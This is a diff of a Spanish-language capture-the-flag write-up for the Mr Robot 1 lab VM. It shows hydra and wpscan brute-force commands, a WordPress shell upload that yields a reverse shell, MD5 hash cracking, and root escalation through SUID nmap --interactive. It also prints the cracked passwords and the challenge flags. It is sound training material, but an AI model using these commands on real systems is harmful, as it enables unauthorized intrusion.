@@ -37,7 +37,26 @@ This VM has three keys hidden in different locations. Your goal is to find all t
 
 The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.
 
-Resolucion 
+## Resolucion
+
+- [MR ROBOT 1](#mr-robot-1)
+  - [MACHINE](#machine)
+  - [Resolucion](#resolucion)
+  - [Fase de Fingerprinting / Reconocimiento (Reconnaissance):](#fase-de-fingerprinting--reconocimiento-reconnaissance)
+    - [Descubrimiento de IP objetivo en la red](#descubrimiento-de-ip-objetivo-en-la-red)
+    - [Descubrimiento de Puertos en objetivo](#descubrimiento-de-puertos-en-objetivo)
+    - [Resumen de los hallazgos.](#resumen-de-los-hallazgos)
+  - [Fase de Footprinting / Exploración (Scanning):](#fase-de-footprinting--exploración-scanning)
+    - [Exploracion puerto 80](#exploracion-puerto-80)
+      - [Resumen de resultados de la exploracion de directorios y ficheros](#resumen-de-resultados-de-la-exploracion-de-directorios-y-ficheros)
+      - [Comprobacion de los hallazgos de la exploracion en el puerto 80](#comprobacion-de-los-hallazgos-de-la-exploracion-en-el-puerto-80)
+        - [Comprobacion del archivo robots.txt](#comprobacion-del-archivo-robotstxt)
+        - [Comprobacion de la instalacion Wordpress](#comprobacion-de-la-instalacion-wordpress)
+        - [Comprobacion de archivo license.txt](#comprobacion-de-archivo-licensetxt)
+    - [Explotacion](#explotacion)
+      - [Acceso al panel de control con las credenciales obtenidas](#acceso-al-panel-de-control-con-las-credenciales-obtenidas)
+    - [Elevacion de privilegio a root](#elevacion-de-privilegio-a-root)
+
 
 Usaré una distribucion Kali OS como maquina atacante.
 
@@ -245,7 +264,6 @@ Al comprobarlo nos da la version 4.3.33 de WordPress.
 
 **Escaneo WPSCAN**
 
-
 ```bash
 wpscan --url http://10.0.2.18 
 ```
@@ -312,7 +330,9 @@ Descargo el fichero license.txt con el comando wget 10.0.2.18:80/license.txt
 Una vez descargado compruebo el fichero.
 
 
+### Explotacion
 
+#### Acceso al panel de control con las credenciales obtenidas
 
 Con estas claves puedo acceder al panel de administracion de wordpress, pero lo mas importante es que con esta credencial y usando el exploit adecuado podria cargar una shell.
 
@@ -448,165 +468,116 @@ Pongo mi maquina a la escucha en el puerto 4444
 
 ![alt text](image-50.png)
 
-Y ahora visito la pagina 404.php para ejecutar la shell
+Y ahora visito la pagina 404.php para ejecutar la shell y en la terminal donde he dejado la escucha en el puerto 4444 consigo una shell de la maquina.
 
+![alt text](image-52.png)
 
+Modifico el bash para tener una terminal con funcionalidades con el comando: 
 
-
-
----
----
----
----
-
-Compruebo acceso
-
-![alt text](image-2.png)
-
-
-
-
-
-
-└─$ wpscan --url http://10.0.2.6 -P /home/kali/Downloads/fsocity.dic  -U 'elliot'
-
-![alt text](image-1.png)
-
-Nos da la clave: [SUCCESS] - elliot / ER28-0652 
-
-![alt text](image-5.png)
-
-
-**Escaneo dirb**
-
-```
-└─$ dirb http://10.0.2.6
-```
-
-
-
-
-#### Resumen de resultados puerto 80
-
-Se detecta una instalacion de wordpress
-Se detecta el acceso a wp-login.php 
-Se detecta fichero robots.txt
-
-Resultados interesantes:
-
-```
-[wordpress-login] [http] [info] http://10.0.2.6/wp-login.php
-[wordpress-readme-file] [http] [info] http://10.0.2.6/readme.html
-[robots-txt-endpoint] [http] [info] http://10.0.2.6/robots.txt
-```
-
-### Resumen de resultados de escaneos con nmap
-
-### Escaneo de vulnerabilidades con vulscan
-
-## Fase de Explotacion / Obtención de Acceso (Gaining Access):
-
-### Puerto XX
-
-## Lateral Movement
-
-## Privilege Escalation
-
-
-
-
----
-
-notas mentales
-
-reducir el diccionario sin duplicados
-
-sort fsocity.dic | uniq | wc -l 
-
-hydra
-hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
-
--vV : Verbose
--L fsocity.dic.uniq : Try all the usernames from the file fsocity.dic.uniq
--p wedontcare : Use an unique password, it doesn’t matter (we’re only interested in the username for now)
-192.168.2.4 : The IP of the machine we’re attacking
-http-post-form : What we’re trying to brute force, here a HTTP POST form
-‘/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username’
-/wp-login.php : The path to where the form is located
-log=^USER^&pwd=^PASS^&wp-submit=Log+In : The POST parameters to send. ^USER^ and ^PASS^ are placeholders that wiil be replaced with the actual values.
-F=Invalid username : Consider an attempt as a failure (F) if the response contains the text Invalid username
-
-Now we know there is a WordPress user named elliot. Let’s try to bruteforce his password using the same technique and word list, shall we?
-
-$ hydra -vV -l elliot -P fsocity.dic.uniq vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
-
-$ msfconsole
-msf > use exploit/unix/webapp/wp_admin_shell_upload
-
-Here we go, a nice meterpreter shell. 🙂 Let’s spawn a TTY shell in it:
-
-shell
-Process 2138 created.
-Channel 1 created.
+```bash
 python -c 'import pty; pty.spawn("/bin/sh")'
-$ id
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
-$
+```
 
+![alt text](image-54.png)
 
-$ ls /home/robot
-key-2-of-3.txt password.raw-md5
+Compruebo directorio de home y encuentro que existe una carpeta de usuario llamada robot y que contiene dos ficheros, un fichero key-2-of-3.txt y otro llamado password.raw-md5
 
+![alt text](image-55.png)
 
+Compruebo el contenido de key-2-of-3.txt
 
-$ cat password.raw-md5
-robot:c3fcd3d76192e4007dfb496cca67e13b
+![alt text](image-56.png)
 
+Al comprobarlo obtengo permiso denegado, por lo que compruebo los permisos de los ficheros encontrados.
 
+![alt text](image-57.png)
 
+Veo que el fichero key-2-of-3.txt solo tiene permiso de lectura desde root, pero que el fichero password.raw-md5 tiene permisos de lectura desde cualquier usuario y permisos de escritura por root.
 
-./hashcat64.bin -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o cracked.txt
+Compruebo el archivo password.raw-md5 al cual si tengo acceso desde el usuario actual
 
+![alt text](image-58.png)
 
+y obtengo : `robot:c3fcd3d76192e4007dfb496cca67e13b`
 
+Por lo que parece es usuario:clave, pero la clave parece ser el hash de la clave. El nombre del fichero me da pista del tipo de hash usado MD5.
+
+Para comprobarlo uso hash-identifier y le paso el hash
+
+![alt text](image-59.png)
+
+Me devuelve MD5 como tipo posible para este hash. 
+
+El siguiente paso es intentar romper este hash. Para ello voy a usar hashcat con el comando
+
+hashcat -a0 -m0 c3fcd3d76192e4007dfb496cca67e13b fsocity.dic.uniq
+
+De esta manera hago un ataque MD5 por diccionario contra el hash usando el diccionario fsocity.dic.uniq
+
+![alt text](image-60.png)
+
+Este ataque no nos da ningun resultado
+
+![alt text](image-61.png)
+
+Voy a realizar el mismo ataque con un diccionario aun mayor que puede tomar mas tiempo en realizarse.
+
+![alt text](image-62.png)
+
+En cuestion de segundos se obtiene la clave crackeada.
 
 c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
 
+![alt text](image-63.png)
 
+Con esta clave ya puedo pasar a usuario robot mediante el comando `su robot`
 
+![alt text](image-64.png)
 
-$ su robot
-Password: abcdefghijklmnopqrstuvwxyz
+Compruebo si puedo acceder a los archivos de la carpeta del usuario robot y leer el contenido del fichero key-2-of-3.txt
 
+![alt text](image-65.png)
 
-robot@linux:~$ cat /home/robot/key-2-of-3.txt
-822c73956184f694993bede3eb39f959
+Con esto he obtenido la 2 de las flags : **`822c73956184f694993bede3eb39f959`**
 
+### Elevacion de privilegio a root
 
-Escalation
+Con el usuario actual `robot` voy a comprobar los permisos SUID de los archivos, para ello uso el siguiente comando:
 
+```bash
 find / -perm -4000 -type f 2>/dev/null
+```
 
-NMap itself! An old version (3.81)
+![alt text](image-66.png)
 
-nmap --interactive
+Uso la herramienta searchbins mediante la cual puedo buscar en GTFObins desde la terminal.
 
-h
- ! <command> -- runs shell command given in the foreground
+![alt text](image-67.png)
 
-nmap> !whoami
-root
+Por ejemplo busco la posibildad de obtener shell con el binario nmap con el comando:
+
+```bash
+./searchbins.sh -b nmap -f shell
+```
+
+![alt text](image-68.png)
+
+y obtengo que si la version de nmap es entre la 2.02 y la 5.21 puedo ejecutar comandos de shell. 
+
+Compruebo si la version de nmap se corresponde:
+
+![alt text](image-69.png)
+
+Obtengo que la version es 3.81, por lo que puedo aplicar el exploit para obtener una shell con permisos de root.
 
 
-nmap> !sh
-# cd /root
-# ls
-firstboot_done key-3-of-3.txt
-# cat key-3-of-3.txt
-04787ddef27c3dee1ee161b21670b4e4
+Abrimos la consola interactiva de nmap con `nmap --interactive` y a continuacion ejecuto a `!sh` lo que me da una shell de root.
 
+![alt text](image-71.png)
 
+Compruebo su directorio y encuentro el fichero key-3-of-3.txt.
 
-![alt text](image-4.png)
+![alt text](image-72.png)
 
-![alt text](image-3.png)
+Lo consulto y obtengo la tercera flag: **`04787ddef27c3dee1ee161b21670b4e4`**
+
